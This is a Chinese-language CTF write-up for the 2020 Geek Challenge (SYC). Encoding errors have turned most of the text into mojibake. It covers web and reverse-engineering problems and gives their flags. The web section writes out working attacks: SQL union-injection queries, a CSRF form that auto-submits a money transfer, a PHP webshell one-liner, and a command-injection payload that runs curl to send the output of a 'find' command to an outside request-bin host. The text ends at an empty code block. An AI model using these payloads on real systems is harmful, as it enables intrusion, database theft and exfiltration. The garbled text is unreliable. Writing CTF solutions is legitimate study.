## Web

### æœ‹å‹çš„å­¦å¦¹

ç­¾åˆ°é¢˜

ç›´æ¥æŸ¥çœ‹é¡µé¢æºç å°±å¯ä»¥çœ‹è§ä¸€ä¸ªflag

```
<!--flag=U1lDe0YxQF80c19oNExwZnVsbGxsbGx9-->
```



### EZwww

#### è€ƒç‚¹ï¼šç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²

æç¤ºä¿¡æ¯ä¸ºï¼šå¤‡ä»½æ˜¯ä¸ªâ€œå¥½ğŸ¤ºâ€ä¹ æƒ¯

æˆ‘ä»¬å°±å¯ä»¥é¦–å…ˆæƒ³åˆ°ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼Œç±»ä¼¼äº.bak 

> æœ‰äº›æ—¶å€™ç½‘ç«™ç®¡ç†å‘˜å¯èƒ½ä¸ºäº†æ–¹ä¾¿ï¼Œä¼šåœ¨ä¿®æ”¹æŸä¸ªæ–‡ä»¶çš„æ—¶å€™å…ˆå¤åˆ¶ä¸€ä»½ï¼Œå°†å…¶å‘½åä¸ºxxx.bakã€‚è€Œå¤§éƒ¨åˆ†Web Serverå¯¹bakæ–‡ä»¶å¹¶ä¸åšä»»ä½•å¤„ç†ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ä¸‹è½½ï¼Œä»è€Œè·å–åˆ°ç½‘ç«™æŸä¸ªæ–‡ä»¶çš„æºä»£ç 

åˆšå¼€å§‹ï¼Œæˆ‘å°è¯•äº†å¥½å¤šæ–‡ä»¶å+bakï¼Œä½†è¿˜æ˜¯æ²¡æ‰¾åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œæœ€åçœ‹åˆ°é¢˜ç›®æç¤ºï¼Œwwwï¼ŒçŒœæµ‹å¯èƒ½å¤‡ä»½æ–‡ä»¶åä¸ºï¼š**www**

å¾—åˆ°çš„å‹ç¼©åŒ…æœ‰ä¸€ä¸ªflag!!!!.txtï¼Œå¯æƒœï¼Œè¿™ä¸ªæ˜¯å‡çš„flag

å†çœ‹å¦ä¸€ä¸ªindex.phpæ–‡ä»¶

```php
<?php
$key1 = $_POST['a'];
$key2 = base64_decode('c3ljbDB2ZXI=');
if($key1 === $key2)
{
    //this is a true flag
echo '<p>SYC{xxxxxxxxxxxxxxxxxx}</p>';
}
?>
```

çœ‹åˆ°è¿™ä¸ªï¼Œé‚£å°±å¾ˆç®€å•äº†

postæäº¤ä¸€ä¸ªaçš„å‚æ•°ï¼Œè¦æ±‚äº**$key2**çš„å€¼ç›¸ç­‰ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬å…ˆæŠŠ$key2ç”¨base64æ¥å‡ºæ¥

æˆ‘ä»¬ç°åœ¨åªéœ€è¦**postä¼ å…¥aå‚æ•°**ï¼Œå€¼ä¸ºï¼š**sycl0ver**

> SYC{Backup_1s_4_good_h4bit_l0l}



### åˆ˜å£®çš„é»‘é¡µ

#### è€ƒç‚¹ï¼šGET&POSTæäº¤

æˆ‘ä»¬æŸ¥çœ‹é¡µé¢ï¼Œçœ‹åˆ°è¿™æ ·ä¸€æ®µè¯**ä½ å¬è¯´è¿‡è¯·æ±‚æ–¹å¼å—ï¼Ÿ**ï¼Œå†çœ‹åˆ°é¡µé¢æœ€ä¸‹é¢

```php
<?php
include("flag.php");
highlight_file(__FILE__);
$username = $_GET['username'];
$passwd = $_POST['passwd'];
if ($username === 'admin' && $passwd === 'syclover') {
    echo $flag;
}
```

ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œåªéœ€è¦æˆ‘ä»¬åˆ†åˆ«ç”¨**POST**å’Œ**GET**ä¼ å…¥ä¸¤å‚æ•°ï¼Œå°±å¥½äº†

> SYC{d0_y0u_k0nw_GET?}



### Welcome

#### è€ƒç‚¹ï¼šPOSTä¼ å‚ï¼Œphpinfoï¼Œç»•è¿‡sha1

è¿›å…¥åé¢˜ç›®åå‘ç°é¡µé¢å›æ˜¾405

çœ‹åˆ°é¢˜ç›®æç¤ºï¼šIn addition to the GET request method, there is another common request method...

ç”¨postä¼ å‚ï¼Œå¹¶ä¸”æ—¥å¸¸çœ‹çœ‹èƒ½ä¸èƒ½çœ‹åˆ°**phpinfo.php**

å°è¯•åæ‰¾åˆ°è¿™ä¸ª

```
http://49.234.224.119:8000/?a=

//postä¼ 
a=<?php phpinfo();?>
```

å°±çœ‹åˆ°ä¸€ç‚¹ä¸œè¥¿ï¼Œï¼ˆå°å£°å“”å“”ä¸€ä¸‹ï¼Œæˆ‘è¿™é‡Œçš„ç¯å¢ƒæ‹¿ç«ç‹ä½¿ç”¨å°±æ²¡é—®é¢˜ï¼Œchromeå°±æœ‰é—®é¢˜äº†ï¼‰

![welcome](images/2020æå®¢å¤§æŒ‘æˆ˜_welcome.png)

```php
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
?>
```

è¿™ä¸ªå°±æ˜¯ä¸€é“å¾ˆç®€å•çš„ä¸€å¥è¯æœ¨é©¬äº†ï¼Œæˆ‘ä»¬æ‹¿èšå‰‘è¿æ¥ï¼Œçœ‹åˆ°åœ¨æ ¹ç›®å½•ä¸‹å°±æœ‰ä¸€ä¸ªflag

> SYC{1iuzHuang_yyd_G0d!}



### ezbypass

#### è€ƒç‚¹ï¼šç»•è¿‡

> Please use a GET request to pass in the variables a and b, compare them with strcmp and let strcmp return a value of NULL.
>
> Note that a and b cannot be equal. 
>
> è¯·ä½¿ç”¨GETè¯·æ±‚ä¼ å…¥å˜é‡aå’Œbï¼Œå°†å…¶ä¸strcmpè¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è®©strcmpè¿”å›NULLå€¼ã€‚
>
> è¯·æ³¨æ„ï¼Œaå’Œbä¸èƒ½ç›¸ç­‰ã€‚

çœ‹åˆ°æç¤ºä¿¡æ¯æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ å˜é‡aå’Œbäº†ï¼Œæ³¨æ„æœ€åä¸€å¥ï¼Œ==aå’Œbä¸èƒ½ç›¸ç­‰==ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œæ—¢ç„¶è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç”¨ä¸€ä¸‹å‰é¢é¢˜ç›®çš„payload

```
?a[]=1&&b=1
```

okï¼Œç¬¬ä¸€éƒ¨åˆ†å·²ç»ç»•è¿‡äº†ï¼Œç°åœ¨è¦æˆ‘ä»¬ç”¨**POSTä¼ å…¥ä¸€ä¸ªå‚æ•°cï¼Œè¦æ±‚éæ•°å­—ï¼Œå¹¶ä»¥ä½¿å…¶ç­‰äº123**

> OKOK,You got the first step.
> Please POST a variable c that is not a number to make it equal to 123 
>
> å¥½çš„ï¼Œæ‚¨è¿ˆå‡ºäº†ç¬¬ä¸€æ­¥ã€‚
> è¯·å‘å¸ƒä¸€ä¸ªéæ•°å­—çš„å˜é‡cä»¥ä½¿å…¶ç­‰äº123

æˆ‘æµ‹è¯•äº†ä¸€ä¸‹ï¼Œåªæœ‰å½“æˆ‘ç”¨**çº¯æ•°å­—**çš„æ—¶å€™ï¼Œæ‰ä¼šæœ‰æŠ¥é”™ï¼Œå› æ­¤æˆ‘åªéœ€è¦åŠ å…¥ä¸€ä¸ªç©ºæ ¼ï¼ˆ%23ï¼‰å°±å¯ä»¥ç»•è¿‡äº†

```
c=123%23
```



### å¸¦æ¶äººå…­æ’

#### è€ƒç‚¹ï¼šSQLæ³¨å…¥

æç¤ºï¼š

> ä½ æƒ³äº†è§£å¸¦æ¶äººå…­æ’å—ï¼Œæ•°æ®åº“é‡Œæœ‰å¤§å®¶å…³äºä»–çš„æè¿°ã€‚

é¦–å…ˆåˆ¤æ–­ç±»å‹ï¼š

æµ‹è¯•åå‘ç°æ˜¯ä¸€ä¸ªå•å¼•å·é—­åˆå­—ç¬¦ä¸²ç±»å‹

```
?id=1' or 1=1 %23
```

æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œå¼€å§‹æ³¨å…¥ï¼Œå…ˆåˆ¤æ–­ä¸€æ³¢å›æ˜¾ä½æ•°

```
?id=0' order by 4 %23	//å›æ˜¾ä½ä¸ºå››ä½
```

è·å–åº“

```
?id=0' union select 1,2,3,database() %23
```

è·å–è¡¨

```
?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema="geek_sql" %23
```

è·å–å­—æ®µ

```
?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name="fllllag"%23
id,fllllllag
```

è·å–å€¼

```
?id=0' union select 1,2,3,group_concat(id,':',fllllllag) from fllllag %23
```



### flagshop

#### è€ƒç‚¹ï¼šCSRFæ”»å‡»

è¿™é“é¢˜æç¤ºæˆ‘ä»¬éœ€è¦åœ¨é¡µé¢é‡Œæåˆ°é’±ï¼Œä¹°åˆ°flagï¼Œå…³é”®ç‚¹å°±æ˜¯**é’±ä»å“ªæ¥**ï¼Ÿ

è®©æˆ‘ä»¬ç°å†ä»”ç»†è§‚å¯Ÿä¸€ä¸‹é¡µé¢ï¼Œæˆ‘ä»¬æ¯ä¸€ä¸ªè´¦å·éƒ½æœ‰ä¸€ä¸ªèº«ä»½idï¼Œæ³¨å†Œç”¨æˆ·çš„èº«ä»½æ˜¯ä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·

åœ¨ä¸»é¡µé‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè´¢åŠ¡ç®¡ç†å‘˜çš„idï¼š==Longlong==ï¼ˆå¾…ä¼šæˆ‘ä»¬ä¼šç”¨åˆ°è¿™ä¸ªIDï¼‰ï¼Œå¦‚æœæåˆ°ä»–çš„è´¦æˆ·ç™»å½•ï¼Œæˆ–è€…è®©ä»–æ‰“é’±ç»™æˆ‘ä»¬æˆ‘ä»¬ä¸å°±æœ‰é’±äº†ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ª**è½¬è´¦çš„é¡µé¢**

é¢˜ç›®çš„æç¤ºä¹ŸéªŒè¯äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œè€Œä¸”ä½†ä¹Ÿå µä¸Šäº†ç¬¬ä¸€æ¡è·¯

> 1.No sessionid!Don't Try to be admin(robot?) 2.Do you know csrf?
>
> 1.æ²¡æœ‰sessionidï¼ä¸è¦å°è¯•æˆä¸ºç®¡ç†å‘˜ï¼ˆæœºå™¨äººï¼Ÿï¼‰2.æ‚¨çŸ¥é“csrfå—ï¼Ÿ



**æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹CSRF**

> æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚è·Ÿè·¨ç½‘ç«™è„šæœ¬ï¼ˆXSSï¼‰ç›¸æ¯”ï¼Œ**XSS** åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»
>
> è·¨ç«™è¯·æ±‚æ”»å‡»ï¼Œç®€å•åœ°è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶è¿è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»è¿è¡Œã€‚è¿™åˆ©ç”¨äº†webä¸­ç”¨æˆ·èº«ä»½éªŒè¯çš„ä¸€ä¸ªæ¼æ´ï¼š**ç®€å•çš„èº«ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„**ã€‚

æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬çš„æ”»å‡»æ‰‹æ®µï¼Œæˆ‘ä»¬éœ€è¦æŒŸåˆ¶ä¸€ä¸ªæœ‰é’±çš„ç”¨æˆ·ï¼Œè®©ä»–æ‰“é’±åˆ°æˆ‘ä»¬çš„è´¦æˆ·ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰é’±ä¹°flagäº†



**ç°åœ¨å°±æ˜¯å®ç°çš„æ­¥éª¤äº†ï¼š**

1. æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªè·¨ç«™è„šæœ¬ï¼Œæ¥ä¼ªé€ ä¸€ä»½è½¬è´¦è®°å½•
2. æˆ‘ä»¬éœ€è¦é€‰æ‹©ä¸€ä¸ªå—å®³è´¦æˆ·ï¼Œè®©ä»–æ¥è¿è¡Œæˆ‘ä»¬çš„è„šæœ¬

æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€çœ‹ä¸€ä¸ª**æ­£å¸¸çš„è½¬è´¦æ•°æ®åŒ…**é•¿ä»€ä¹ˆæ ·å­

```
POST /transfer.php HTTP/1.1
Host: 173.82.206.142:8005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------41269904543009196447964679449
Content-Length: 402
Origin: http://173.82.206.142:8005
Connection: close
Referer: http://173.82.206.142:8005/transfer.php
Cookie: PHPSESSID=95912f409b60a14797aa6d00f05471c1
Upgrade-Insecure-Requests: 1

-----------------------------41269904543009196447964679449
Content-Disposition: form-data; name="target"

q
-----------------------------41269904543009196447964679449
Content-Disposition: form-data; name="money"

1
-----------------------------41269904543009196447964679449
Content-Disposition: form-data; name="messages"

emmm
-----------------------------41269904543009196447964679449--
```

å¤´éƒ¨ä¿¡æ¯æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½**URLåœ°å€**

ä¸‹é¢çš„æ–‡ä»¶ä¿¡æ¯å€’æ˜¯ä¹‹å‰æ²¡æœ‰è§åˆ°è¿‡ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„POSTæäº¤



> POST å‡ ç§è¯·æ±‚ä¸»è¦åŒ…æ‹¬ application/x-www-form-urlencodedã€ multipart/form-dataã€application/jsonã€text/xml å››ç§çš„æ–¹æ³•
>
> 1ã€application/x-www-form-urlencoded (é»˜è®¤å¸¸ç”¨)
>
> â€‹	æœ€å¸¸è§çš„ POST æäº¤æ•°æ®çš„æ–¹å¼
>
> 2ã€multipart/form-data
>
> â€‹	ä»¤ä¸€ä¸ªå¸¸è§çš„ POST æ•°æ®æäº¤çš„æ–¹å¼ã€‚**æˆ‘ä»¬ä½¿ç”¨è¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶**ï¼Œå¿…é¡»è®© è¡¨å•çš„ enctypedç­‰äº multipart/form-data
>
> è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¿™æ¬¡çš„POSTæäº¤æ–¹å¼äº†
>
> 3ã€application/json
>
> â€‹	è¿™ç§æ–¹æ¡ˆï¼Œå¯ä»¥æ–¹ä¾¿çš„**æäº¤å¤æ‚çš„ç»“æ„åŒ–æ•°æ®**ï¼Œè¿™ç§POSTæäº¤æ–¹å¼è¶Šæ¥è¶Šå¤šï¼Œç”¨æ¥å‘Šè¯‰æœåŠ¡ç«¯æ¶ˆæ¯ä¸»ä½“æ˜¯åºåˆ—åŒ–åçš„ JSON å­—ç¬¦ä¸²
>
> 4ã€text/xml
>
> â€‹	ç°åœ¨åŸºæœ¬ä¸ç”¨

**multipart/form-data**ï¼šå°±æ˜¯æˆ‘ä»¬è¿™ä¸€æ¬¡ç”¨åˆ°çš„ä¸€ç§POSTæäº¤æ–¹å¼äº†

```php
<form action="http://173.82.206.142:8005/transfer.php" method=post enctype="multipart/form-data">
	<input type="text" name="target" class="form-control form-control-line" value='e'>
    //ç¬¬ä¸€ä¸ªinputå°±æ˜¯æäº¤æˆ‘ä»¬çš„è½¬è´¦å¯¹è±¡ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·äº†
	<input type="text" name="money" class="form-control form-control-line" value='10000000000000000000'>
    //ç¬¬ä¸€ä¸ªinputæ˜¯è½¬è´¦çš„é‡‘é¢
	<input type="submit" class="btn btn-success" value="è½¬è´¦">
    //æäº¤æŒ‰é’®ï¼Œæˆ‘ä»¬è¦ä¿è¯æ•°æ®åŒ…çš„å®Œæ•´ï¼Œä¸‹é¢çš„ä¹Ÿæ˜¯
	<textarea rows="5" name="messages" class="form-control form-control-line"></textarea>
</form>
<script>document.forms[0].submit();</script>	//è¿™ä¸ªå°±æ˜¯å†™ä¸€ä¸ªjsè‡ªåŠ¨æäº¤ï¼Œå½“ç‚¹åˆ°è¿™ä¸ªphpé¡µé¢çš„æ—¶å€™ï¼Œè‡ªåŠ¨è¿›è¡Œæäº¤
```

okï¼Œå·²ç»å®Œæˆäº†ä¸€åŠäº†ï¼Œç°åœ¨éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·ï¼Œè®©ä»–å»ç‚¹å‡»æˆ‘ä»¬çš„è¿™ä¸ªé¡µé¢



æˆ‘ä»¬çœ‹åˆ°æŠ¥å‘Šé¡µé¢ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç”¨æˆ·åé¦ˆé¡µé¢ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å…¶ä¸­ä¸€æ¡

![2020æå®¢å¤§æŒ‘æˆ˜-flagshop](images/2020æå®¢å¤§æŒ‘æˆ˜-flagshop.png)

æˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªæŠ¥å‘Šï¼Œè¿™ä¸ªLonglongä¼šå»ç‚¹å‡»æŠ¥å‘Šé‡Œçš„é“¾æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŒŸåˆ¶ä»–ç»™æˆ‘ä»¬æ‰“é’±äº†

ä½†æˆ‘ä»¬åœ¨æäº¤æŠ¥å‘Šæ—¶é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªéªŒè¯ç å¡«ä»€ä¹ˆ

> md5($code)[0:5] == d93b5

å†™ä¸€ä¸ªè„šæœ¬å§ï¼š

```python
import hashlib

def md5value(s):  # md5åŠ å¯†å‡½æ•°
    md5 = hashlib.md5()  # è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡
    md5.update(s.encode('utf-8'))  # æŒ‡å®šéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²
    return md5.hexdigest()  # è·å–åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²

for i in range(0, 10000000):
    if md5value(str(i))[0:5] == "d93b5":	#å¡«å…¥å€¼
        print(i)
        break
```

okï¼Œæˆ‘ä»¬åªéœ€è¦å°†PHPæ–‡ä»¶éƒ¨ç½²å†è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå†æŠ¥å‘Šæäº¤é“¾æ¥å°±å¯ä»¥äº†ï¼ŒæˆåŠŸä¹°åˆ°flag



### çŸ¥Xå ‚çš„phpæ•™ç¨‹

#### è€ƒç‚¹ï¼šä»£ç æ‰§è¡Œ

æç¤ºï¼š

> çŸ¥Xå ‚ï¼ˆPS:è¯·å‹¿å¯¹å·å…¥åº§ï¼‰çš„phpæ•™ç¨‹å¼€è¯¾å•¦ï¼ã‚“ï¼Ÿå¥½åƒä¸å¤ªå¯¹åŠ²ï¼Ÿ
>
> æ³¨æ„æŸ¥çœ‹å½“å‰ç›®å½•å’Œæ–‡ä»¶å

è¿›å…¥åï¼Œç‚¹å‡»æ•™æ¡ˆè¿›å…¥ä¸€ä¸ªç›®å½•ï¼Œè¿™é‡Œçš„æ–‡ä»¶åä¸ºï¼š**listdir.php**

![2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚](images/2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚1.png)

è¿›å…¥flag.phpï¼Œå‘ç°urlæ˜¯**phpfile=**ï¼Œè€Œä¸”åé¢ç›´æ¥å¸¦äº†ä¸€ä¸ªæ–‡ä»¶å°±èƒ½æ‰“å¼€æŸ¥çœ‹å†…å®¹äº†ï¼Œè€Œä¸”é¡µé¢æç¤ºçœ‹ç›®å½•æ–‡ä»¶ï¼Œäºæ˜¯æ›´æ”¹ä¸º**listdir.php**å°±å¯ä»¥çœ‹åˆ°å†…å®¹äº†

![2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚](images/2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚2.png)

æ–‡ä»¶æ‰“å¼€åå¯ä»¥çœ‹åˆ°ç›®å½•é¡µé¢ä¸‹çš„æºä»£ç äº†

![2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚](images/2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚3.png)

**æ³¨æ„ï¼š** 

è¿™ä¸ªç›®å½•ç•Œé¢æœ‰ä¸ª$_GET['dirname']å‚æ•°è¢«ä¼ è¿›å»ï¼Œè€Œä¸”ç›´æ¥æ”¾åˆ°äº†exec()ä¸­ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“exec()å…è®¸æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº



åŒæ—¶ï¼Œè¿™é‡Œè¿˜å¼•ç”¨äº†ä¸€ä¸ªwaf.phpï¼Œé‚£æˆ‘ä»¬å†çœ‹ä¸€ä¸‹è¿™ä¸ªwaf

![2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚](images/2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚4.png)

è¿™ä¸ªwafé‡Œé¢è®¾ç½®äº†è¿‡æ»¤

**æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨dirnameå‚æ•°æ¥è¿›è¡Œä»£ç æ‰§è¡Œï¼Œéœ€è¦ç»•è¿‡ä¸€äº›ä¸œè¥¿**

æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥ä»£ç ï¼Œå¯æ˜¯æ²¡æœ‰å›æ˜¾



è¿™é‡Œæ¨èä½¿ç”¨ä¸€ä¸ªåœ¨çº¿ç½‘ç«™ï¼Œ[å¯¹URLåˆ†ææ”¶é›†å¯¹å…¶å‘å‡ºçš„è¯·æ±‚](http://requestbin.net/)

åŸç†æ˜¯è®©é¶æœºè®¿é—®è¿™ä¸ªurlï¼Œè¿™ä¸ªç½‘ç«™ä¼šå¯¹é¶æœºçš„è¯·æ±‚åŒ…åšä¸€ä¸ªåˆ†æï¼ŒåŒæ—¶è¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ªæ•°æ®

è¿™å°±æ˜¯æˆ‘ä»¬æœ€åçš„payload

```
/listdir.php?dirname=; curl http://requestbin.net/r/wo949nwo?inspect=`find / -name 'flag'`
```

![2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚](images/2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚5.png)

æ‰¾åˆ°äº†è·¯å¾„ï¼Œç›´æ¥æ‹¿å»æ‰“å¼€å°±å¥½äº†

![2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚](images/2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚6.png)



### å¿æ‚”çš„åˆ˜å£®

#### è€ƒç‚¹ï¼špythonè„šæœ¬ç¼–å†™

æç¤ºï¼š

> åˆ˜å£®å¤©å¤©å¹²åäº‹ï¼Œè¿™æ¬¡ç»ˆäºè®©æˆ‘é€®åˆ°ä»–åœ¨pythonæ•™å ‚å¿æ‚”äº†

è®©æˆ‘ä»¬å›ç­”ä¸€ä¸ªéšæœºç­”æ¡ˆï¼Œæ¯å¿æ‚”ä¸€æ¬¡æˆåŠŸå°±è®°å½•ä¸€æ¬¡ï¼Œéœ€è¦æˆ‘ä»¬ä¸€ç›´å¿æ‚”20æ¬¡ï¼Œä½†ç»™æˆ‘ä»¬çš„æ—¶é—´åªæœ‰3ç§’ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å†™è„šæœ¬æ¥å¿æ‚”ï¼Œéœ€è¦å¸¦ä¸Šä¸Šä¸€æ¬¡çš„cookie

```python
import requests
def request_func(req):
    cookie_new = requests.utils.dict_from_cookiejar(req.cookies)
    req = request.post("http://120.79.197.4:5000/check",data=cookie_new)
    result = req.text
    print(result)
    return req

request=requests.session()
url = "http://120.79.197.4:5000/"
req = request.get(url)
cookie = requests.utils.dict_from_cookiejar(req.cookies)
req2 = request.post("http://120.79.197.4:5000/check",data=cookie)
result = req2.text
print(result)
need_req = request_func(req2)
i = 0
while i < 20:
    i += 1
    need_req = request_func(req)
```



## Re

### No RE no gain

#### è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨

æ¯”è¾ƒç®€å•çš„reé¢˜ç›®ï¼Œé‡Œé¢æœ‰å¥½å¤šflagï¼Œä½†éƒ½ä¸å¯¹ï¼Œåªæœ‰ä¸‹é¢å•ç‹¬çš„æ˜¯

> SYC{S4y_He11o_th3_RE_World!!!}



### æˆ‘çœŸä¸ä¼šå†™é©±åŠ¨ï¼

#### è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨

æ¯”ä¸Šé¢ä¸€é¢˜è¿˜ç®€å•ï¼Œç›´æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²å°±å‡ºæ¥äº†

> SYC{First_Win64_DRIVER}



### WhatsApk

#### è€ƒç‚¹ï¼šå®‰å“é€†å‘å·¥å…·

æˆ‘ä»¬è¦ç”¨åˆ°å®‰å“é€†å‘çš„å·¥å…·ï¼Œæœç´¢flagå°±å‡ºæ¥äº†



### re00

#### è€ƒç‚¹ï¼šå¼‚æˆ–åŠ å¯†

ç”¨IDAæ‰“å¼€ï¼Œè¿›å…¥ä¸»å‡½æ•°

```c
  puts("please input your flag:");
  read(0, buf, 0x30uLL);
  if ( strlen(buf) == 32 )
  {
    puts("nonono!");
    exit(0);
  }
  for ( i = 0; i <= 31; ++i )
  {
    if ( (char)(buf[i] ^ 0x44) != byte_4060[i] )
    {
      puts("wow, almost!");
      exit(0);
    }
  }
  puts("yes! you get it!");
  result = 0LL;
  v1 = v4 < *MK_FP(__FS__, 40LL);
  return result;
}
```

æˆ‘ä»¬çœ‹åˆ°ï¼Œbuf[i] ^ 0x44 è¿›è¡Œå¼‚æˆ–ï¼Œæˆ‘ä»¬ç°åœ¨æ‰¾åˆ°**byte_4060[i]**å°±å¯ä»¥å†™ä¸ªpythonè¿›è¡Œå¼‚æˆ–äº†

```python
str = [0x17, 0x1D, 0x07, 0x3F, 0x37, 0x2D, 0x29, 0x34, 0x28, 0x21, 0x1B, 0x37, 0x2D, 0x29, 0x34, 0x28, 0x21, 0x1B, 0x3C, 0x2B, 0x36, 0x36, 0x36, 0x1B, 0x36, 0x2D, 0x23, 0x2C, 0x30, 0x7B, 0x7B, 0x39]

flag = ''
for i in range(0,32):
    flag += chr(str[i] ^ 0x44)
print(flag)
```

> SYC{simple_simple_xorrr_right??}



### maze

#### è€ƒç‚¹ï¼šè¿·å®«é¢˜

ç”¨IDAæ‰“å¼€ï¼Œæƒ¯ä¾‹æ‰¾æ‰¾å­—ç¬¦ä¸²ï¼Œåœ¨é‡Œé¢å‘ç°äº†ä¸€ä¸²å¾ˆå¥‡shjæ€ªçš„-----å’Œoooooï¼Œè¿›å…¥åå°±æ˜¯æˆ‘ä»¬è¦çš„ä¸»å‡½æ•°

é€šè¿‡sh'j

é€†å‘è§£å‡ºè¿·å®«å›¾ï¼Œè·å¾—èµ·å§‹ç‚¹å’Œç»ˆç‚¹

```
___________ooooo_____o________o
_ooooooooo__ooo__ooo_oooooooooo
_oooooooooo__o__oooo_oooooooooo
________oooo___ooooo_oooooooooo
ooooooo_oooooooooooo_oooooooooo
ooooooo_ooooo_oooooo_oooooooooo
ooooooo_ooooo_oooooo_oooooooooo
S_______ooooo_oooooo__________E
ooooooooooooooooooooooooooooooo
```

flagå°±æ˜¯è·¯çº¿ï¼Œå¾—åˆ°flag

```
SYC{dddddddwwwwaaaaaaawwwddddddddddsdsdsddwdwdwddddsssssssdddddddddd}
```



### Hello.NET





```python
